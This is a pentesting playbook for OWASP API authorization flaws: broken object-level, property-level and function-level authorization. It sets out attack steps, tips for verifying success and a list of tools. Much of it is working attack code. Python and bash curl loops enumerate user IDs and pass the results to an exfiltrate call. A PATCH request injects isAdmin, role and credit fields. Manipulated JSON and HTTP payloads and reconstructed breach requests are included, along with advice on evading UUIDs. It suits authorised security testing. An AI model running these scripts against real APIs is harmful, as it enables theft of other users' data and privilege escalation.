# OWASP API1/API3 — BOLA & Object-Property Authorization

## When this applies

- API endpoint takes an object identifier (`/api/users/123`) without verifying the caller's ownership.
- Update endpoints accept an object body and bind ALL submitted properties (including `isAdmin`, `role`, `credit`).
- API path uses sequential integers / GUIDs that can be enumerated.

## Technique

Test endpoints with another user's ID to access their data (BOLA — Broken Object Level Authorization). For property-level: identify privileged fields in GET responses or schema; inject those fields in PUT/PATCH/POST to escalate (BOPLA — Broken Object Property Level Authorization).

## Steps

### API1:2023 - Broken Object Level Authorization (BOLA)

**Attack scenarios:**
- `GET /api/users/123` → change to 456 for unauthorized access
- `GET /api/documents/abc` → iterate through document IDs
- `POST /api/orders/789` → modify other users' orders

**Real-world examples:**
- **Trello 2024:** 15M users' data exposed via API lacking authorization
- **Dating App:** Users accessed reporter information via object ID manipulation

**Vulnerable code:**
```python
@app.route('/api/users/<user_id>')
def get_user(user_id):
    user = User.query.get(user_id)  # No authorization!
    return jsonify(user.data)
```

**Sequential ID enumeration:**
```python
for id in range(1, 1000000):
    data = api_call(f"/api/users/{id}")
    if data.status_code == 200:
        exfiltrate(data)
```

### API3:2023 - Broken Object Property Level Authorization (BOPLA)

**Attack scenarios:**
1. Accessing restricted patient data fields
2. User modifies `isAdmin` field for privilege escalation
3. Manipulating transaction amounts
4. Reducing prices via hidden fields

**Parameter manipulation:**
```json
// Standard
{"user_id": "123", "action": "view"}

// Manipulated
{"user_id": "456", "action": "admin_access", "bypass": true}
```

### API5:2023 - Broken Function Level Authorization

**Attack scenarios:**
1. Regular user accessing `/api/admin/users`
2. Using PUT/DELETE on GET-only endpoints
3. Accessing privileged operations without role checks

**Authentication bypass:**
```http
GET /api/internal/admin/users HTTP/1.1
# No Authorization header required!
```

### Combined enumeration + privilege escalation

```bash
# 1. Enumerate IDs
for id in $(seq 1 1000); do
  curl -s -H "Authorization: Bearer $TOK" "https://api/v1/users/$id" \
    -o /dev/null -w "%{http_code} %{size_download}\n"
done

# 2. For each accessible foreign user, try property escalation
curl -X PATCH -H "Authorization: Bearer $TOK" \
  -d '{"isAdmin": true, "role": "admin", "credit": 999999}' \
  "https://api/v1/users/456"
```

### Real-world breach examples

**Cox Communications (2024)** — API2 + API5 — admin access without authentication:
```http
POST /api/admin/customer-lookup HTTP/1.1
{"modem_id": "TARGET_MAC", "action": "remote_config"}
→ Admin access without authentication
```

**Dell (2024)** — API4 — bulk record exfiltration:
```python
for customer_id in range(1, 50000000):
    response = requests.get(
        f"https://dell-api.com/customers/{customer_id}",
        headers={"API-Key": "PARTNER_KEY"}
    )
```

**Coinbase (2025)** — API6 — business logic flaw in trading API:
```http
POST /api/trade/sell HTTP/1.1
{
  "asset_to_sell": "ETH",
  "amount": 0.5,
  "sell_as_asset": "BTC",
  "expected_value_usd": 1000
}
→ Sold $1000 ETH as $43,000 BTC
```

## Verifying success

- BOLA: response returns another user's data (different name/email).
- BOPLA: re-fetching the user shows the injected field (`isAdmin: true`).
- Function-level: admin route returns admin data with a regular user token.

## Common pitfalls

- Some apps use UUIDs — enumerate via leaks (search endpoint, public profile).
- Mass-assign field names vary per language — try `isAdmin`, `is_admin`, `admin`, `IsAdmin`.
- Some endpoints return 404 for foreign IDs but 200 with empty body for invalid — diff sizes.

## Tools

- Burp Suite Autorize (cross-role testing)
- ffuf, Burp Intruder for ID enumeration
- Arjun, Param Miner for hidden fields
- curl
